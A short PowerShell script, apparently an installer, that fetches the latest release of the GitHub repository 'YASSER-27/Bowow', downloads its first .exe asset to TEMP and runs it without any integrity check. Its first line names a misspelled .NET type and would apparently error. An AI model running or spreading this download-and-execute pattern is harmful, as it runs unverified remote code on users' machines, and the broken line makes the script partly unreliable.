[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolTypes]::Tls12
$repo = "YASSER-27/Bowow"
$release = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases/latest"
$asset = $release.assets | Where-Object { $_.name -like "*.exe" } | Select-Object -First 1
$url = $asset.browser_download_url
$dest = "$env:TEMP\$($asset.name)"
Invoke-WebRequest -Uri $url -OutFile $dest
Start-Process -FilePath $dest -Wait
